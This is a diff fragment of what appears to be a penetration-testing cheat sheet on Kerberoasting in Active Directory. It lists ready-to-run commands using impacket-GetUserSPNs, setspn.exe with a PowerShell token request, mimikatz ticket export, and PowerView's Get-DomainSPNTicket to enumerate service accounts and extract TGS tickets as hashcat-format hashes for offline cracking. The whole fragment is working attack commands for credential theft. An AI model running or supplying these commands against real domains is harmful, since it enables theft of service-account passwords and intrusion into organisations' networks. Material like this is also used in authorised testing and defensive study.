@@ -136,6 +136,7 @@ $ impacket-GetUserSPNs -dc-ip IP domain/user:password # list all
 $ impacket-GetUserSPNs -dc-ip IP domain/user:password -request # get TGS for all
 $ impacket-GetUserSPNs -dc-ip IP domain/user:password -request-user cn -outputfile cn_tgs # get TGS for 'cn'
 ```
+
 ```shell!
 PS> setspn.exe -Q */* # list all (ignore computer accounts)
 PS> setspn.exe -T domain -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() } # get TGS for all
@@ -148,10 +149,9 @@ mimikatz> kerberos::list /export # cat b64 | tr -d '\n' | base64 -d > cn.kirbi
 ```
 
 ```shell!
-PS> Import-Module .\PowerView.ps1
-PS> Get-DomainUser * -spn | select samaccountname
-PS> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\xxx.csv -NoTypeInformation
+PS> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
 PS> Get-DomainUser cn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes # encryption scheme
+PS> Get-DomainUser -Identity cn | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\xxx.csv -NoTypeInformation
 ```
 
 ```shell!
